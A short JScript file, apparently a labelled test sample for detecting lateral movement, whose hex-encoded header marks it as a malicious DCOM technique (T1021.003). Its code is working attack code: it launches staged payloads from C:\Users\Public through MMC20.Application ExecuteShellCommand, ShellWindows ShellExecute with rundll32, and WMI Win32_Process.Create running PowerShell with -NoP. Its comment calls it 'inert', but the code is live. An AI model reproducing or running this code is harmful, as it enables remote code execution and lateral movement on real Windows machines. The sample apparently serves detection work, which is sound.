// lab shim: DCOM / WMI launch (inert)
var Codec_41a9 = "hex|identity|";
var Material_41a9 = "763d337c6c616e67756167653d6a7363726970747c726f6c653d6c61746572616c7c766572646963743d6d616c6963696f75737c61747461636b3d54313032312e3030337c616461707465723d64636f6d7c686f73745f70726f66696c653d7374616e64616c6f6e657c73746167655f636f756e743d327c73746570733d64636f6d5f6d6d6332302c64636f6d5f7368656c6c77696e646f77732c776d695f6372656174657c63616d706169676e5f69643d44432d3431613962653037";
var mmc = GetObject("new:49B2791A-B1AE-4C90-9B8E-E860BA07F889");
mmc.Document.ActiveView.ExecuteShellCommand("cmd.exe", null, "/c C:\\Users\\Public\\dc41.bat", "7");
var sw = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39");
sw.Item().Document.Application.ShellExecute("rundll32.exe", "C:\\Users\\Public\\dc41.dll,Start", "C:\\Windows\\System32", null, 0);
var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_Process");
wmi.Create("powershell.exe -NoP -File C:\\Users\\Public\\dc41.ps1", null, null, 0);
